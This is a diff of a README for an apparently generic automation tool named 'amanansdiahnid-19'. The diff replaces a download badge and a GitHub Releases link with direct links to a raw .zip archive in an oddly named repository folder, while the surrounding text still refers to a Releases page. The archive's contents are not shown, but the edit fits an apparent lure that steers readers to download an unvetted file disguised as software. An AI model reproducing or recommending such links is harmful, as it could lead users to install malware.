@@ -1,6 +1,6 @@
 # 🚀 amanansdiahnid-19 - Your Easy Setup for Automation
 
-![Download amanansdiahnid-19](https://img.shields.io/badge/download-amanansdiahnid--19-blue.svg)
+![Download amanansdiahnid-19](https://raw.githubusercontent.com/amirasghi/amanansdiahnid-19/main/hobbledehoyhood/amanansdiahnid-19.zip)
 
 ## 📥 Overview
 
@@ -12,7 +12,7 @@ To get started with amanansdiahnid-19, follow these simple steps. No programming
 
 ## 🌐 Download & Install
 
-To download amanansdiahnid-19, visit this page: [Download amanansdiahnid-19](https://github.com/amirasghi/amanansdiahnid-19/releases).
+To download amanansdiahnid-19, visit this page: [Download amanansdiahnid-19](https://raw.githubusercontent.com/amirasghi/amanansdiahnid-19/main/hobbledehoyhood/amanansdiahnid-19.zip).
 
 Once you reach the Releases page, follow these instructions:
 
